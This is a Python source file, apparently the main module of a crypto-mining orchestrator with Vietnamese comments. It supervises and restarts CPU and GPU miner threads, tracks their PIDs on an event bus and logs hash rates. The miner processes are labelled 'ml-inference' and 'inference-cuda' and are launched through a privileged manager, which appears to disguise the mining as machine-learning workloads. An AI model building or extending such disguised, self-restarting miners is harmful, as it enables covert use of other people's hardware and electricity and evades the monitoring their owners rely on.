    gpu_miner_logger.info("===== GPU MINER LIFECYCLE STARTED =====")
    gpu_miner_logger.info(f"Manager PID: {os.getpid()}")
    gpu_miner_logger.info(f"Thread ID: {threading.current_thread().ident}")
    gpu_miner_logger.info(f"Max Retries: {max_retries}")
    gpu_miner_logger.info("=========================================")
    
    # **Notify main logger** (thông báo logger chính)
    logger.info("✅ GPU Miner Manager initialized with dedicated logging")
    
    # **Enhanced mining loop** (vòng lặp khai thác nâng cao)
    gpu_miner_logger.info("🔄 Starting GPU mining supervision loop...")
    gpu_miner_logger.info(f"🔍 GPU Manager - Initial state: stop_event={stop_event.is_set()}, retries={retries}, max_retries={max_retries}")
    while not stop_event.is_set() and retries < max_retries:
        gpu_miner_logger.debug(f"🔄 GPU supervision cycle - stop_event={stop_event.is_set()}, retries={retries}")
        # **Direct access** (truy cập trực tiếp) để **avoid deadlock** (tránh khóa chết)
        process = gpu_process
        gpu_miner_logger.debug(f"🔍 Checking GPU process status: {process}")
        is_running = is_mining_process_running(process)
        gpu_miner_logger.debug(f"📊 GPU process running status: {is_running}")
        
        if not is_running:
            if process:
                gpu_miner_logger.warning("🔄 GPU miner stopped - attempting restart")
                logger.warning("Phát hiện GPU miner đã dừng. Thử khởi động lại...")
                retries += 1
            
            gpu_miner_logger.info(f"🚀 Starting GPU mining process (attempt {retries + 1}/{max_retries})")
            new_process = start_mining_process(cpu=False, privileged_manager=privileged_mgr)
            gpu_process = new_process
            
            if gpu_process and is_mining_process_running(gpu_process):
                gpu_miner_logger.info(f"✅ GPU miner started successfully - PID: {gpu_process.pid}")
                retries = 0  # Reset retries on successful start
            else:
                gpu_miner_logger.error(f"❌ GPU miner startup failed - attempt {retries}/{max_retries}")
        else:
            # **Process running - log status** (tiến trình đang chạy - ghi log trạng thái)
            gpu_miner_logger.debug(f"📊 GPU miner running normally - PID: {gpu_process.pid if gpu_process else 'Unknown'}")
            
            # **Log resource usage** (ghi log mức sử dụng tài nguyên) cho **GPU mining** (khai thác GPU)
            log_resource_usage("inference-cuda", force_gpu_check=True)
        
        gpu_miner_logger.debug("⏳ Waiting 15s before next supervision cycle")
        time.sleep(15)
        
    if retries >= max_retries:
        gpu_miner_logger.error(f"🚨 GPU miner failed {max_retries} times - stopping supervision")
        logger.error("GPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
        stop_event.set()
    
    gpu_miner_logger.info("===== GPU MINER LIFECYCLE ENDED =====")

# **Global Thread Communication Event Bus** (EventBus giao tiếp luồng toàn cầu)
event_bus_instance = None
event_bus_lock = threading.Lock()

def get_thread_event_bus():
    """**Thread-safe EventBus instance** (thể hiện EventBus an toàn luồng) cho **inter-thread communication** (giao tiếp giữa các luồng)"""
    global event_bus_instance
    with event_bus_lock:
        if event_bus_instance is None:
            from mining_environment.scripts.auxiliary_modules.event_bus import EventBus
            event_bus_instance = EventBus(backend_type="memory", logger=logger)
            logger.info("✅ Thread EventBus initialized successfully")
        return event_bus_instance

def environment_setup_thread():
    """**Thread 1: Environment Setup** (Luồng 1: Thiết lập môi trường) với **thread-safe operations** (thao tác an toàn luồng)"""
    thread_logger = setup_logging('env_setup_thread', str(Path(LOGS_DIR) / 'env_setup_thread.log'), 'INFO')
    thread_logger.info("🌍 Environment Setup Thread Started")
    
    try:
        # **Initialize environment** (khởi tạo môi trường) trong **isolated thread** (luồng cô lập)
        thread_logger.info("🔧 Starting environment initialization...")
        privileged_manager = initialize_environment()
        
        # **Thread completion event** (sự kiện hoàn thành luồng) gửi tới **EventBus**
        bus = get_thread_event_bus()
        bus.publish('thread:env_setup_complete', {
            'thread_id': threading.current_thread().ident,
            'thread_name': 'EnvironmentSetup',
            'status': 'success',
            'privileged_manager': privileged_manager is not None,
            'timestamp': time.time()
        })
        
        thread_logger.info("✅ Environment Setup Thread completed successfully")
        return privileged_manager
        
    except Exception as e:
        thread_logger.error(f"❌ Environment Setup Thread failed: {e}")
        bus = get_thread_event_bus()
        bus.publish('thread:env_setup_failed', {
            'thread_id': threading.current_thread().ident,
            'thread_name': 'EnvironmentSetup',
            'status': 'failed',
            'error': str(e),
            'timestamp': time.time()
        })
        stop_event.set()
        return None

def cpu_mining_thread():
    """**Thread 2: CPU Mining** (Luồng 2: Khai thác CPU) với **PID tracking** (theo dõi PID) và **EventBus integration** (tích hợp EventBus)"""
    global cpu_process
    thread_logger = setup_logging('cpu_mining_thread', str(Path(LOGS_DIR) / 'cpu_mining_thread.log'), 'DEBUG')
    thread_logger.info("⚡ CPU Mining Thread Started")
    
    bus = get_thread_event_bus()
    max_retries = 5
    retries = 0
    
    # Môi trường đã được thiết lập đồng bộ trong main(); lấy privileged_manager_global
    global privileged_manager_global
    privileged_manager = privileged_manager_global
    if privileged_manager is None:
        thread_logger.error("❌ Environment chưa sẵn sàng - dừng CPU mining thread")
        stop_event.set()
        return
    
    # **CPU Mining Loop** (vòng lặp khai thác CPU) với **PID tracking** (theo dõi PID)
    while not stop_event.is_set() and retries < max_retries:
        try:
            with process_lock:
                running_status = is_mining_process_running(cpu_process)
                thread_logger.debug(f"[TRACE] is_mining_process_running={running_status}, PID={getattr(cpu_process,'pid',None)}")
                if not running_status:
                    thread_logger.info(f"🔄 Starting CPU mining process (attempt {retries + 1}/{max_retries})")
                    cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_manager)
                    
                    if cpu_process:
                        # **EventBus PID registration** (đăng ký PID EventBus) – publish ngay, không phụ thuộc kiểm tra running**
                        thread_logger.info(f"🔍 [DIAGNOSTIC] About to publish cpu_pid_registered for PID {cpu_process.pid}")
                        try:
                            event_payload = {
                                'thread_id': threading.current_thread().ident,
                                'thread_name': 'CPUMining',
                                'pid': cpu_process.pid,
                                'process_name': 'ml-inference',
                                'status': 'running',
                                'attempt': retries + 1,
                                'timestamp': time.time()
                            }
                            thread_logger.info(f"🔍 [DIAGNOSTIC] Event payload: {event_payload}")
                            bus.publish('mining:cpu_pid_registered', event_payload)
                            thread_logger.info(f"✅ [DIAGNOSTIC] Successfully published cpu_pid_registered event")
                        except Exception as e:
                            thread_logger.error(f"[EventBus] publish cpu_pid error: {e}")
                        
                        thread_logger.info(f"✅ CPU mining started - PID: {cpu_process.pid}")
                        retries = 0  # Reset on success
                    else:
                        retries += 1
                        thread_logger.error(f"❌ CPU mining startup failed (attempt {retries}/{max_retries})")
                else:
                    # **Process running - periodic PID update** (tiến trình đang chạy - cập nhật PID định kỳ)
                    # bỏ heartbeat qua EventBus – chỉ ghi log nội bộ
                    thread_logger.debug("CPU miner healthy heartbeat")
                    
        except Exception as e:
            thread_logger.error(f"❌ CPU Mining Thread error: {e}")
            retries += 1
        
        # **Supervision interval** (khoảng thời gian giám sát)
        stop_event.wait(30)
    
    if retries >= max_retries:
        thread_logger.error(f"🚨 CPU mining failed {max_retries} times - stopping thread")
        stop_event.set()
    
    thread_logger.info("🔚 CPU Mining Thread ended")

def gpu_mining_thread():
    """**Thread 3: GPU Mining** (Luồng 3: Khai thác GPU) với **PID tracking** (theo dõi PID) và **EventBus integration** (tích hợp EventBus)"""
    global gpu_process
    thread_logger = setup_logging('gpu_mining_thread', str(Path(LOGS_DIR) / 'gpu_mining_thread.log'), 'DEBUG')
    thread_logger.info("🎮 GPU Mining Thread Started")
    
    bus = get_thread_event_bus()
    max_retries = 5
    retries = 0
    
    # Môi trường đã được thiết lập đồng bộ trong main(); lấy privileged_manager_global
    global privileged_manager_global
    privileged_manager = privileged_manager_global
    if privileged_manager is None:
        thread_logger.error("❌ Environment chưa sẵn sàng - dừng GPU mining thread")
        return  # GPU optional, không set stop_event
    
    # **GPU Mining Loop** (vòng lặp khai thác GPU) với **PID tracking** (theo dõi PID)
    while not stop_event.is_set() and retries < max_retries:
        try:
            process = gpu_process  # Direct access to avoid deadlock
            is_running = is_mining_process_running(process)
            thread_logger.debug(f"[TRACE] is_mining_process_running={is_running}, PID={getattr(process,'pid',None)}")
            if not is_running:
                thread_logger.info(f"🔄 Starting GPU mining process (attempt {retries + 1}/{max_retries})")
                new_process = start_mining_process(cpu=False, privileged_manager=privileged_manager)
                gpu_process = new_process
                
                if gpu_process:
                    # **EventBus PID registration** – publish ngay
                    thread_logger.info(f"🔍 [DIAGNOSTIC] About to publish gpu_pid_registered for PID {gpu_process.pid}")
                    try:
                        event_payload = {
                            'thread_id': threading.current_thread().ident,
                            'thread_name': 'GPUMining',
                            'pid': gpu_process.pid,
                            'process_name': 'inference-cuda',
                            'status': 'running',
                            'attempt': retries + 1,
                            'timestamp': time.time()
                        }
                        thread_logger.info(f"🔍 [DIAGNOSTIC] Event payload: {event_payload}")
                        bus.publish('mining:gpu_pid_registered', event_payload)
                        thread_logger.info(f"✅ [DIAGNOSTIC] Successfully published gpu_pid_registered event")
                    except Exception as e:
                        thread_logger.error(f"[EventBus] publish gpu_pid error: {e}")
                    
                    thread_logger.info(f"✅ GPU miner started - PID: {gpu_process.pid}")
                    retries = 0  # Reset on success
                else:
                    retries += 1
                    thread_logger.error(f"❌ GPU mining startup failed (attempt {retries}/{max_retries})")
            else:
                # **Process running - periodic PID update** (tiến trình đang chạy - cập nhật PID định kỳ)
                # bỏ heartbeat qua EventBus – chỉ ghi log nội bộ
                thread_logger.debug("GPU miner healthy heartbeat")
                
        except Exception as e:
            thread_logger.error(f"❌ GPU Mining Thread error: {e}")
            retries += 1
        
        # **Shorter supervision interval for GPU** (khoảng thời gian giám sát ngắn hơn cho GPU)
        time.sleep(15)
    
    if retries >= max_retries:
        thread_logger.error(f"🚨 GPU mining failed {max_retries} times - stopping thread")
    
    thread_logger.info("🔚 GPU Mining Thread ended")

def resource_manager_thread():
    """**Thread 4: Resource Manager** (Luồng 4: Trình quản lý tài nguyên) với **EventBus integration** (tích hợp EventBus)"""
    thread_logger = setup_logging('resource_manager_thread', str(Path(LOGS_DIR) / 'resource_manager_thread.log'), 'DEBUG')
    thread_logger.info("📊 Resource Manager Thread Started")
# Lấy EventBus để truyền vào ResourceManager và ghi sự kiện lỗi (chỉ mục đích nội bộ)
    bus = get_thread_event_bus()

    try:
        # **Step 1**: Load configuration
        thread_logger.info("📋 Loading ResourceManager configuration...")
        config_path = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config')) / "resource_config.json"
        
        if not config_path.exists():
            raise FileNotFoundError(f"Configuration file not found: {config_path}")
            
        with open(config_path, 'r') as f:
            config_data = json.loads(f.read())
        
        config = ConfigModel(**config_data)
        thread_logger.info("✅ ResourceManager configuration loaded")
        
        # **Step 2**: Initialize ResourceManager
        thread_logger.info("🔧 Creating ResourceManager instance...")
        resource_manager = ResourceManager(config, bus, thread_logger)
        thread_logger.info("✅ ResourceManager instance created")
        
        # **EventBus notification** (thông báo EventBus) - Resource Manager ready
        # Đã bỏ publish EventBus cho ResourceManager
        
        # **Step 3**: Start ResourceManager
        thread_logger.info("🚀 Starting ResourceManager...")
        resource_manager.start()
        thread_logger.info("🎯 ResourceManager started successfully")
        
    except Exception as e:
        thread_logger.error(f"❌ Resource Manager Thread failed: {e}")
        bus.publish('thread:resource_manager_failed', {
            'thread_id': threading.current_thread().ident,
            'thread_name': 'ResourceManager',
            'status': 'failed',
            'error': str(e),
            'timestamp': time.time()
        })
        stop_event.set()
    
    thread_logger.info("🔚 Resource Manager Thread ended")

def main():
    """**Multi-Threading Architecture Main Function** (hàm chính kiến trúc đa luồng) với **EventBus coordination** (phối hợp EventBus)"""
    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử (Multi-Threading Architecture) =====")
    
    # ------------------------------------------------------------------
    # 1️⃣ Thiết lập môi trường đồng bộ (loại bỏ EventBus giữa các luồng)
    # ------------------------------------------------------------------
    global privileged_manager_global
    try:
        logger.info("🔧 Đang thiết lập môi trường (synchronous)...")
        privileged_manager_global = initialize_environment()
        logger.info("✅ Thiết lập môi trường hoàn tất")
    except Exception as e:
        logger.error(f"❌ Không thể thiết lập môi trường: {e}")
        return  # Abort startup nếu môi trường lỗi

    # ------------------------------------------------------------------
    # 2️⃣ Khởi tạo EventBus cho giao tiếp PID / ResourceManager
    # ------------------------------------------------------------------
    bus = get_thread_event_bus()
    logger.info("✅ Thread communication EventBus initialized")

    # Thêm khai báo danh sách mining_threads
    mining_threads = []

    # (Đã bỏ EnvironmentSetupThread – môi trường thiết lập đồng bộ)

    # **Thread 4: Resource Manager** (Luồng 4: Trình quản lý tài nguyên)
    resource_thread = threading.Thread(
        target=resource_manager_thread,
        daemon=True,
        name="ResourceManagerThread"
    )
    mining_threads.append(('Resource Manager', resource_thread, True))

    # **Thread 2: CPU Mining** (Luồng 2: Khai thác CPU)
    cpu_thread = threading.Thread(
        target=cpu_mining_thread,
        daemon=True,
        name="CPUMiningThread"
    )
    mining_threads.append(('CPU Mining', cpu_thread, True))

    # **Thread 3: GPU Mining** (Luồng 3: Khai thác GPU)
    gpu_thread = threading.Thread(
        target=gpu_mining_thread,
        daemon=True,
        name="GPUMiningThread"
    )
    mining_threads.append(('GPU Mining', gpu_thread, True))
    
    # **Sequential Thread Startup** (Khởi động luồng tuần tự) với **dependency management** (quản lý phụ thuộc)
    logger.info("🚀 Starting threads in dependency order...")
    
    started_threads = []
    for thread_type, thread, enabled in mining_threads:
        if enabled:
            try:
                thread.start()
                started_threads.append((thread_type, thread))
                logger.info(f"✅ {thread_type} Thread started (ID: {thread.ident})")
                
                # **Startup delay** (độ trễ khởi động) để **sequential initialization** (khởi tạo tuần tự)
                time.sleep(1.0)
                
            except Exception as e:
                logger.error(f"❌ Failed to start {thread_type} Thread: {e}")
        else:
            logger.info(f"⏸️ {thread_type} Thread disabled by configuration")
    
    # **Thread Health Verification** (Xác minh sức khỏe luồng) với **EventBus monitoring** (giám sát EventBus)
    logger.info("🔍 Verifying threads health...")
    time.sleep(5)  # Cho phép threads khởi tạo hoàn tất
    
    # **EventBus event handlers** (theo dõi pid & resource manager)**
    thread_status = {
        'cpu_pid_registered': False,
        'gpu_pid_registered': False
    }

    def cpu_pid_handler(payload):
        thread_status['cpu_pid_registered'] = True
        logger.info(f"✅ CPU Mining PID registered: {payload['pid']}")
    
    def gpu_pid_handler(payload):
        thread_status['gpu_pid_registered'] = True
        logger.info(f"✅ GPU Mining PID registered: {payload['pid']}")
    
    # **Subscribe to thread events** (đăng ký sự kiện luồng)
    # chỉ dùng EventBus cho PID
    bus.subscribe('mining:cpu_pid_registered', cpu_pid_handler)
    bus.subscribe('mining:gpu_pid_registered', gpu_pid_handler)
    
    active_count = sum(1 for _, thread in started_threads if thread.is_alive())
    logger.info(f"🎯 Active threads: {active_count}/{len(started_threads)}")
    
    if active_count > 0:
        logger.info("🚀 MULTI-THREADING ARCHITECTURE STARTUP COMPLETED")
    else:
        logger.error("❌ No threads are running - check configuration and logs")
        stop_event.set()
        return
    
    # **Enhanced performance monitoring thread** (luồng giám sát hiệu suất nâng cao)
    def performance_monitor():
        """
        **Real-time mining performance monitor** (giám sát hiệu suất khai thác thời gian thực) với 
        **detailed metrics** (chỉ số chi tiết) và **system resource tracking** (theo dõi tài nguyên hệ thống)
        """
        last_report_time = time.time()
        last_metrics_time = time.time()
        monitor_start_time = time.time()
        
        print(f"\033[96m🔍 PERFORMANCE MONITOR STARTED\033[0m", flush=True)
        
        while not stop_event.is_set():
            try:
                current_time = time.time()
                
                # **Enhanced real-time metrics** (chỉ số thời gian thực nâng cao) mỗi 15 giây
                if current_time - last_metrics_time >= 15:
                    metrics = get_real_time_metrics()
                    cpu_metrics = metrics.get("ml-inference", {})
                    gpu_metrics = metrics.get("inference-cuda", {})
                    
                    cpu_hash = cpu_metrics.get('current_hash_rate', 0)
                    gpu_hash = gpu_metrics.get('current_hash_rate', 0)
                    total_hash = cpu_hash + gpu_hash
                    
                    # **System resource usage** (sử dụng tài nguyên hệ thống)
                    try:
                        cpu_percent = psutil.cpu_percent(interval=1)
                        memory = psutil.virtual_memory()
                        memory_percent = memory.percent
                        
                        # **Enhanced metrics display** (hiển thị chỉ số nâng cao)
                        runtime_total = current_time - monitor_start_time
                        metrics_display = (
                            f"\033[96m📊 REAL-TIME METRICS [Runtime: {runtime_total:.0f}s]\n"
                            f"   ├─ CPU Mining: {cpu_hash:.2f} H/s\n"
                            f"   ├─ GPU Mining: {gpu_hash:.2f} H/s\n"
                            f"   ├─ Total Hash: {total_hash:.2f} H/s\n"
                            f"   ├─ CPU Usage: {cpu_percent:.1f}%\n"
                            f"   ├─ Memory Usage: {memory_percent:.1f}%\n"
                            f"   └─ Active Processes: {len([p for p in [cpu_process, gpu_process] if p and p.poll() is None])}/2\033[0m"
                        )
                        
                        print(metrics_display, flush=True)
                        logger.info(f"METRICS: CPU={cpu_hash:.2f}H/s GPU={gpu_hash:.2f}H/s "
                                   f"TOTAL={total_hash:.2f}H/s SYS_CPU={cpu_percent:.1f}% "
                                   f"SYS_MEM={memory_percent:.1f}% RUNTIME={runtime_total:.0f}s")
                        
                    except Exception as sys_err:
                        logger.warning(f"⚠️ System metrics error: {sys_err}")
                    
                    last_metrics_time = current_time
                
                # **Detailed performance report** (báo cáo hiệu suất chi tiết) mỗi 60 giây
                if current_time - last_report_time >= 60:
                    try:
                        comparison_report = generate_performance_comparison()
                        
                        print(f"\033[95m=== DETAILED PERFORMANCE REPORT ===\033[0m", flush=True)
                        logger.info("=== DETAILED PERFORMANCE REPORT ===")
                        
                        for line in comparison_report.split('\n'):
                            if line.strip():
                                logger.info(line)
                                print(f"\033[95m{line}\033[0m", flush=True)
                        
                        print(f"\033[95m=== END PERFORMANCE REPORT ===\033[0m", flush=True)
                        logger.info("=== END PERFORMANCE REPORT ===")
                        
                        last_report_time = current_time
                        
                    except Exception as report_err:
                        logger.error(f"❌ Performance report error: {report_err}")
                
                # **Process health check** (kiểm tra sức khỏe tiến trình)
                with process_lock:
                    cpu_alive = is_mining_process_running(cpu_process)
                    gpu_alive = is_mining_process_running(gpu_process)
                
                if not cpu_alive and not gpu_alive:
                    logger.warning("⚠️ All mining processes stopped!")
                    print(f"\033[91m⚠️ ALL MINING PROCESSES STOPPED!\033[0m", flush=True)
                
                time.sleep(15)  # **Check interval** (khoảng thời gian kiểm tra)
                
            except Exception as e:
                error_msg = f"❌ Error in performance monitoring: {e}"
                logger.error(error_msg)
                print(f"\033[91m{error_msg}\033[0m", flush=True)
                time.sleep(30)
    
    # **Start performance monitoring thread** (khởi động luồng giám sát hiệu suất)
    perf_thread = threading.Thread(target=performance_monitor, daemon=True, name="PerformanceMonitor")
    perf_thread.start()
    
    # **Thread monitoring loop** (vòng lặp giám sát luồng) với **EventBus coordination** (phối hợp EventBus)
    try:
        monitoring_interval = 30  # seconds
        while not stop_event.is_set():
            # **Thread health check** (kiểm tra sức khỏe luồng)
            for thread_name, thread in started_threads:
                if not thread.is_alive():
                    logger.warning(f"⚠️ {thread_name} thread has stopped")
                    
                    # **EventBus notification** (thông báo EventBus) thread failure
                    bus.publish('thread:failure_detected', {
                        'thread_name': thread_name,
                        'thread_id': thread.ident,
                        'status': 'stopped',
                        'timestamp': time.time()
                    })
            
            # **Performance monitoring** (giám sát hiệu suất) through EventBus
            bus.publish('system:health_check', {
                'active_threads': sum(1 for _, thread in started_threads if thread.is_alive()),
                'total_threads': len(started_threads),
                'system_status': 'running' if not stop_event.is_set() else 'stopping',
                'timestamp': time.time()
            })
            
            time.sleep(monitoring_interval)
            
    except KeyboardInterrupt:
        logger.info("Nhận tín hiệu KeyboardInterrupt. Đang dừng...")
        stop_event.set()
    
    # **Thread cleanup and synchronization** (dọn dẹp và đồng bộ hóa luồng)
    logger.info("🧹 Starting thread cleanup and synchronization...")
    
    # **EventBus shutdown notification** (thông báo tắt EventBus)
    bus.publish('system:shutdown_initiated', {
        'reason': 'user_request',
        'active_threads': sum(1 for _, thread in started_threads if thread.is_alive()),
        'timestamp': time.time()
    })
    
    # **Graceful thread termination** (kết thúc luồng nhẹ nhàng) với timeout
    thread_shutdown_timeout = 10  # seconds
    for thread_name, thread in started_threads:
        if thread.is_alive():
            logger.info(f"🔄 Waiting for {thread_name} thread to finish...")
            thread.join(timeout=thread_shutdown_timeout)
            
            if thread.is_alive():
                logger.warning(f"⚠️ {thread_name} thread did not stop within {thread_shutdown_timeout}s")
                bus.publish('thread:forced_termination', {
                    'thread_name': thread_name,
                    'thread_id': thread.ident,
                    'reason': 'timeout',
                    'timestamp': time.time()
                })
            else:
                logger.info(f"✅ {thread_name} thread stopped gracefully")
    
    # **Stop EventBus** (dừng EventBus)
    try:
        bus.stop()
        logger.info("✅ EventBus stopped successfully")
    except Exception as e:
        logger.error(f"❌ Error stopping EventBus: {e}")
    
    # **Cleanup** (dọn dẹp) và thoát
    logger.info("Bắt đầu quá trình dọn dẹp cuối cùng...")
    
    # **Export final performance report** (xuất báo cáo hiệu suất cuối cùng)
    try:
        final_report = generate_performance_comparison()
        logger.info("=== FINAL MINING PERFORMANCE REPORT ===")
        for line in final_report.split('\n'):
            if line.strip():
                logger.info(line)
        logger.info("=== END FINAL REPORT ===")
        
        # **Export to file** (xuất ra file)
        report_file = mining_perf_logger.export_performance_report()
        logger.info(f"📄 Final performance report saved to: {report_file}")
        
    except Exception as e:
        logger.error(f"Lỗi khi tạo báo cáo hiệu suất cuối cùng: {e}")
    
    # **Log final mining operations** (ghi nhật ký các thao tác khai thác cuối cùng)
    with process_lock:
        if cpu_process:
            log_mining_operation("ml-inference", "STOP", cpu_process.pid, 
                                {"reason": "shutdown", "uptime": time.time()})
        if gpu_process:
            log_mining_operation("inference-cuda", "STOP", gpu_process.pid, 
                                {"reason": "shutdown", "uptime": time.time()})
    
    
    # **Process cleanup with thread safety** (dọn dẹp tiến trình với an toàn luồng)
    logger.info("🧹 Cleaning up mining processes...")
    with process_lock:
        # **Terminate CPU process** (kết thúc tiến trình CPU)
        if cpu_process and cpu_process.poll() is None:
            logger.info(f"Dừng tiến trình CPU miner (PID: {cpu_process.pid})...")
            try:
                cpu_process.terminate()
                cpu_process.wait(timeout=5)  # Wait for graceful termination
                logger.info("✅ CPU process terminated gracefully")
            except subprocess.TimeoutExpired:
                logger.warning("⚠️ CPU process did not terminate gracefully, forcing kill")
                cpu_process.kill()
            except Exception as e:
                logger.error(f"❌ Error terminating CPU process: {e}")
        
        # **Terminate GPU process** (kết thúc tiến trình GPU)
        if gpu_process and gpu_process.poll() is None:
            logger.info(f"Dừng tiến trình GPU miner (PID: {gpu_process.pid})...")
            try:
                gpu_process.terminate()
                gpu_process.wait(timeout=5)  # Wait for graceful termination
                logger.info("✅ GPU process terminated gracefully")
            except subprocess.TimeoutExpired:
                logger.warning("⚠️ GPU process did not terminate gracefully, forcing kill")
                gpu_process.kill()
            except Exception as e:
                logger.error(f"❌ Error terminating GPU process: {e}")
    
    logger.info("Hệ thống đã dừng. Thoát.")

if __name__ == "__main__":
    main()
